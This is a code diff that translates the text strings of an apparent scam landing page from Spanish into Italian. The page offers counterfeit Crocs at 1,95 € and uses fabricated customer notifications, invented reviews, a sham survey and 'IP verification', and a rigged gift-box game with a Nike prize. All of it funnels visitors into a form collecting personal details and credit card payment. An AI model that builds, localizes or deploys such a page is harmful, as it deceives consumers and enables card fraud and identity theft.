@@ -8,13 +8,13 @@ const landingUrl = baseHref + window.location.pathname;
 const imageBase = baseUrl ?? landingUrl;
 
 (function (exp) {
-  const countryCode = "es";
-  const lang = "es-ES";
+  const countryCode = "it";
+  const lang = "it-IT";
   const locale = lang;
 
   const sizes = {
     enabled: true,
-    selectText: "TALLA: ",
+    selectText: "TAGLIA: ",
     arr: [
       "EU 36",
       "EU 37",
@@ -49,133 +49,133 @@ const imageBase = baseUrl ?? landingUrl;
 
   const bottomRow = {
     bar: "menu",
-    account: "Iniciar sesión",
-    heart: "Lista de deseos",
-    bag: "Carrito",
-    find: "Buscar"
+    account: "Accedi",
+    heart: "Lista dei desideri",
+    bag: "Carrello",
+    find: "Cerca"
   };
 
   const mainProduct = {
-    header: "Oferta limitowana",
-    name: "Zuecos unisex Classic U",
+    header: "Offerta limitata",
+    name: "Classic Clog",
     oldPrice: "49,99 €",
     newPrice: "1,95 €",
-    selectText: "COLOR: ",
-    text: `Disfruta de un ajuste a tu medida, resistente al agua y con ventilación para mayor transpirabilidad. Crocs
-          Classic es el zapato perfecto para cualquier ocasión. Completamente moldeado con material Croslite™.
+    selectText: "COLORE: ",
+    text: `Goditi una calzata su misura, resistente all'acqua e con ventilazione per una maggiore traspirabilità. Crocs
+          Classic è la scarpa perfetta per ogni occasione. Completamente modellata con materiale Croslite™.
 <br></br>
-          Increíblemente ligeras y súper divertidas en los pies.
+          Incredibilmente leggere e super divertenti ai piedi.
   `,
   };
 
   const notifications = [
     {
       user: "Manuel S*****",
-      location: "Barcelona, España",
-      action: "¡Acabo de recibir la Zuecos por 1,95 euros!",
-      timeago: "hace 15 segundos",
+      location: "Roma, Italia",
+      action: "Appena ricevuto gli Clog per 1,95 euro!",
+      timeago: "15 secondi fa",
     },
     {
       user: "Carlos B******",
-      location: "Madrid, España",
-      action: "¡Acabo de recibir la Zuecos por 1,95 euros!",
-      timeago: "hace 25 segundos",
+      location: "Milano, Italia",
+      action: "Appena ricevuto gli Clog per 1,95 euro!",
+      timeago: "25 secondi fa",
     },
   ];
 
   const reviewsArr = [
     {
       name: "Mateo",
-      time: "Hace un día",
-      header: "¡Es increíble!",
+      time: "Un giorno fa",
+      header: "È incredibile!",
       product: "26468781",
-      review: "“¡Me encanta mi zueco clásico Crocs! Son increíblemente cómodos e ideales para caminar y hacer jardinería. Ligero y fácil de limpiar 😊",
+      review: "“Amo i miei Clog classici Crocs! Sono incredibilmente comodi e ideali per camminare e fare giardinaggio. Leggeri e facili da pulire 😊",
       image: "./index_files/review1.jpg",
     },
     {
       name: "Lucas",
-      time: "Hace dos días",
-      header: "¡Genial! No tengo palabras.",
+      time: "Due giorni fa",
+      header: "Geniale! Non ho parole.",
       product: "26468783",
-      review: "Compré Crocs para la playa, pero ahora los uso todos los días. Cómodos, no irritan y tus pies no sudan con ellos. Gran elección",
+      review: "Ho comprato i Crocs per la spiaggia, ma ora li uso tutti i giorni. Comodi, non irritano e i piedi non sudano con loro. Ottima scelta",
       image: "./index_files/review2.jpg",
     },
     {
       name: "Valentina",
-      time: "Hace dos días",
-      header: "Simplemente genial.",
+      time: "Due giorni fa",
+      header: "Semplicemente geniale.",
       product: "26468782",
-      review: "A mi hija le encantan los Crocs con los coloridos Jibbitz. No sólo son bonitos, sino también cómodos. Adecuado tanto para la escuela como para excursiones.",
+      review: "A mia figlia piacciono molto i Crocs con i colorati Jibbitz. Non solo sono carini, ma anche comodi. Adatti sia per la scuola che per le gite.",
       image: "./index_files/review3.jpg",
     },
     {
       name: "Santiago",
-      time: "Hace cuatro días",
-      header: "Me gusta",
+      time: "Quattro giorni fa",
+      header: "Mi piace",
       product: "26468782",
-      review: "Al principio era escéptico, pero después del primer uso entendí por qué todo el mundo los ama tanto. Increíblemente cómodo y ligero. Excelente compra!",
+      review: "All'inizio ero scettico, ma dopo il primo utilizzo ho capito perché tutti li amano così tanto. Incredibilmente comodi e leggeri. Ottimo acquisto!",
       image: "./index_files/review4.jpg",
     },
     {
       name: "Martina",
-      time: "Hace siete días",
-      header: "¡Guau, me encanta este producto!",
+      time: "Sette giorni fa",
+      header: "Wow, adoro questo prodotto!",
       product: "26468783",
-      review: "¡Me encantan los Crocs! Son tan suaves y cómodos que puedo usarlos todo el día sin cansarme. Ideal para viajes y largas caminatas. ¡Se lo recomiendo a todos!",
+      review: "Amo i Crocs! Sono così morbidi e comodi che posso indossarli tutto il giorno senza stancarmi. Ideali per viaggi e lunghe passeggiate. Li consiglio a tutti!",
       image: "./index_files/review5.jpg",
     },
   ];
 
   const reviews = {
     reviews: reviewsArr,
-    rr: "OPINIONES Y RESEÑAS",
+    rr: "OPINIONI E RECENSIONI",
     percent: "99%",
-    rec: "Comentarios sobre esta promoción",
+    rec: "Commenti su questa promozione",
   };
 
   const questions = {
-    _of: "Pregunta {1} de {2}: ",
+    _of: "Domanda {1} di {2}: ",
     arr: [
       {
-        q: "¿Has utilizado nuestros productos?",
+        q: "Hai mai utilizzato i nostri prodotti?",
         a: [
-          "Sí, compro a menudo",
-          "Sí, compro raramente",
-          "Nunca he comprado",
+          "Sì, compro spesso",
+          "Sì, compro raramente",
+          "Non ho mai comprato",
         ],
       },
       {
-        q: "¿Nos recomendarías a tus amigos?",
-        a: ["¡Sí, por supuesto!", "Sí, pero cambia el diseño de los crocs.", "No"],
+        q: "Ci raccomanderesti ai tuoi amici?",
+        a: ["Sì, assolutamente!", "Sì, ma cambia il design dei crocs.", "No"],
       },
       {
-        q: "¿Qué color de Crocs es el más popular este año?",
-        a: ["Negro", "Verde", "Blanco", "Rojo"],
+        q: "Quale colore di Crocs è il più popolare quest'anno?",
+        a: ["Nero", "Verde", "Bianco", "Rosso"],
       },
     ],
   };
 
   const check = {
-    title: "Tu respuesta será verificada...",
+    title: "La tua risposta sarà verificata...",
     arr: [
-      "Has respondido a la pregunta 3/3.",
-      "Tu dirección IP no permite sacar conclusiones sobre solicitudes anteriores.",
-      "Tu respuesta ha sido verificada.",
+      "Hai risposto alla domanda 3/3.",
+      "Il tuo indirizzo IP non consente di trarre conclusioni sulle richieste precedenti.",
+      "La tua risposta è stata verificata.",
     ],
   };
 
   const modals = {
     welcome: {
       texts: {
-        header: "Felicidades, has confirmado que eres una persona real",
+        header: "Congratulazioni, hai confermato di essere una persona reale",
         button: "OK",
         text: `
         <center>
-       Hoy, {date}, tienes la oportunidad de comprar un par de zapatos Nike Air Force 1'07 a un precio especial
+       Oggi, {date}, hai la possibilità di acquistare un paio di scarpe Nike Air Force 1'07 a un prezzo speciale
           <br><br>
-         Todo lo que necesitas hacer es elegir la caja de regalo correcta.
+         Tutto quello che devi fare è scegliere la scatola regalo giusta.
           <br><br>
-      Tienes 3 intentos, ¡buena suerte!
+      Hai 3 tentativi, buona fortuna!
         </center>
       `,
       },
@@ -186,26 +186,26 @@ const imageBase = baseUrl ?? landingUrl;
         button: "OK",
         text: `
         <center>
-    Lamentablemente, este regalo está vacío! Aún tienes 2 intentos - ¡buena suerte!
+    Purtroppo, questo regalo è vuoto! Hai ancora 2 tentativi - buona fortuna!
         </center>
       `,
       },
     },
     win: {
       texts: {
-        header: "¡Felicidades! ¡Has ganado!",
+        header: "Congratulazioni! Hai vinto!",
         button: "OK",
         text: `
         <center>
           <p style="color: #000">
-       Has ganado un par de zapatillas "Nike Air Force 1'07"
+       Hai vinto un paio di scarpe "Nike Air Force 1'07"
           </p>
           <br>
-            1) Haz clic en "OK" para ir a la página de entrega.
+            1) Clicca su "OK" per andare alla pagina di consegna.
             <br><br>
-            2) Completa el formulario y paga el pedido aprovechando tu descuento personal.
+            2) Compila il modulo e paga l'ordine sfruttando il tuo sconto personale.
             <br><br>
-            3) El paquete será entregado en 2-3 días.
+            3) Il pacco sarà consegnato in 2-3 giorni.
         </center>
       `,
       },
@@ -214,71 +214,72 @@ const imageBase = baseUrl ?? landingUrl;
 
   const cartSteps = {
     personal: {
-      title: "Información personal",
+      title: "Informazioni personali",
       fields: {
         name: {
           enabled: true,
-          field: "Nombre",
+          field: "Nome",
         },
         family: {
           enabled: true,
-          field: "Apellido",
+          field: "Cognome",
         },
         phone: {
           enabled: true,
-          field: "Número de teléfono",
+          field: "Numero di telefono",
         },
         email: {
           enabled: true,
-          field: "Correo electrónico",
+          field: "Indirizzo email",
         },
       },
     },
     delivery: {
-      title: "Entrega",
+      title: "Consegna",
       fields: {
         city: {
           enabled: true,
-          field: "Ciudad",
+          field: "Città",
         },
         address: {
           enabled: true,
-          field: "Dirección de entrega",
+          field: "Indirizzo di consegna",
         },
         zip: {
           enabled: true,
-          field: "Código postal",
+          field: "Codice postale",
         },
       },
     },
     payment: {
-      title: "Métodos de pago",
-      creditCard: "Pago en línea con tarjeta de crédito",
+      title: "Metodi di pagamento",
+      creditCard: "Pagamento online con carta di credito",
     },
   };
 
   const cart = {
     steps: cartSteps,
     main: {
-      title: "Detalles del pedido",
+      title: "Dettagli dell'ordine",
       oldPrice: "49,99 €",
       newPrice: "1,95 €",
-      size: "Talla",
+      size: "Taglia",
       subTotal: {
-        title: "Subtotal",
+        title: "Totale parziale",
         amount: "1,95 €",
       },
       delivery: {
-        title: "Entrega",
+        title: "Consegna",
         amount: "0,00 €",
       },
       total: {
-        title: "Total",
+        title: "Totale",
         amount: "1,95 €",
       },
-      checkoutButton: "Paga tu pedido",
+      checkoutButton: "Paga il tuo ordine",
     },
   };
+
 
   const products = [
     {
@@ -383,7 +384,7 @@ const imageBase = baseUrl ?? landingUrl;
   ];
 
   const footer = {
-    cr: "© Crocs™ | Copyright 2024 | Todos los derechos reservados",
+    cr: "© Crocs™ | Diritto d'autore 2024 | Tutti i diritti riservati",
   };
 
   const pathImgBox = {
